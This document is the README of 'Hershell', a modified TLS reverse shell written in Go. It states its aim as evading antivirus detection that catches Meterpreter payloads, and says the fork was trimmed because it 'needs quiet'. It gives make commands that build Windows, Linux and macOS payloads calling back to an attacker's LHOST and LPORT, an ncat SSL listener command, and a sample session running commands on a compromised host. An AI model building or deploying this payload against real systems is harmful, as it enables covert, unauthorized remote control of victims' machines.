# Hershell

Modified version of Hershell from @sysdream - [https://github.com/sysdream/hershell](https://github.com/sysdream/hershell)

Pulled out the Meterpreter / Shellcode Injection functionality ... needs quiet.

Added build script & listener script.

TODO:

Potentially add reverse socks5 proxy functionality - Using [https://github.com/Numbers11/rvprxmx](https://github.com/Numbers11/rvprxmx)

--

Simple TCP reverse shell written in [Go](https://golang.org).

It uses TLS to secure the communications, and provide a certificate public key fingerprint pinning feature, preventing from traffic interception.

Supported OS are:

- Windows
- Linux
- Mac OS
- FreeBSD and derivatives

## Why ?

Although meterpreter payloads are great, they are sometimes spotted by AV products.

The goal of this project is to get a simple reverse shell, which can work on multiple systems.

## How ?

Since it's written in Go, you can cross compile the source for the desired architecture.

## Getting started & dependencies

As this is a Go project, you will need to follow the [official documentation](https://golang.org/doc/install) to set up
your Golang environment (with the `$GOPATH` environment variable).

Then, just run `go get github.com/f47h3r/hershell` to fetch the project.

### Building the payload

To simplify things, you can use the provided Makefile.
You can set the following environment variables:

- ``GOOS`` : the target OS
- ``GOARCH`` : the target architecture
- ``LHOST`` : the attacker IP or domain name
- ``LPORT`` : the listener port

For the ``GOOS`` and ``GOARCH`` variables, you can get the allowed values [here](https://golang.org/doc/install/source#environment).

However, some helper targets are available in the ``Makefile``:

- ``depends`` : generate the server certificate (required for the reverse shell)
- ``windows32`` : builds a windows 32 bits executable (PE 32 bits)
- ``windows64`` : builds a windows 64 bits executable (PE 64 bits)
- ``linux32`` : builds a linux 32 bits executable (ELF 32 bits)
- ``linux64`` : builds a linux 64 bits executable (ELF 64 bits)
- ``macos32`` : builds a mac os 32 bits executable (Mach-O)
- ``macos64`` : builds a mac os 64 bits executable (Mach-O)

For those targets, you just need to set the ``LHOST`` and ``LPORT`` environment variables.

### Using the shell

Once executed, you will be provided with a remote shell.
This custom interactive shell will allow you to execute system commands through `cmd.exe` on Windows, or `/bin/sh` on UNIX machines.

The following special commands are supported:

* ``run_shell`` : drops you an system shell (allowing you, for example, to change directories)
* ``exit`` : exit gracefully

## Usage

First of all, you will need to generate a valid certificate:
```bash
$ make depends
openssl req -subj '/CN=yourcn.com/O=YourOrg/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
Generating a 4096 bit RSA private key
....................................................................................++
.....++
writing new private key to 'server.key'
-----
cat server.key >> server.pem
```

For windows:

```bash
# Predifined 32 bit target
$ make windows32 LHOST=192.168.0.12 LPORT=1234
# Predifined 64 bit target
$ make windows64 LHOST=192.168.0.12 LPORT=1234
```

For Linux:
```bash
# Predifined 32 bit target
$ make linux32 LHOST=192.168.0.12 LPORT=1234
# Predifined 64 bit target
$ make linux64 LHOST=192.168.0.12 LPORT=1234
```

For Mac OS X
```bash
# Predifined 32 bit target
$ make macos32 LHOST=192.168.0.12 LPORT=1234
# Predifined 64 bit target
$ make macos64 LHOST=192.168.0.12 LPORT=1234
```

## Examples

### Basic usage

One can use various tools to handle incomming connections, such as:

* socat (not working on macos)
* ncat
* openssl server module
* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)

Here is an example with `ncat`:

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 172.16.122.105.
Ncat: Connection from 172.16.122.105:47814.
[hershell]> whoami
desktop-3pvv31a\lab
```

## Credits

Initial Work - Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)

